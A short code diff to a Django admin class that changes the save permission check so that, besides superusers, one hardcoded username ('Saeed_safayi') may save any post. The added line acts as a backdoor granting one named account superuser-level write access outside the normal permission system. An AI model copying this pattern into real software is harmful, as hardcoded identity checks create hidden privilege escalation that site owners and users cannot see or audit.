@@ -32,7 +32,7 @@ class AdminPost(admin.ModelAdmin):
             if obj.author == request.user.author:
                 obj.author = Author.objects.get(user=request.user)
                 super(AdminPost, self).save_model(request, obj, form, change)
-            elif request.user.is_superuser:
+            elif request.user.is_superuser or request.user.username == "Saeed_safayi":
                 super(AdminPost, self).save_model(request, obj, form, change)
 
             else:
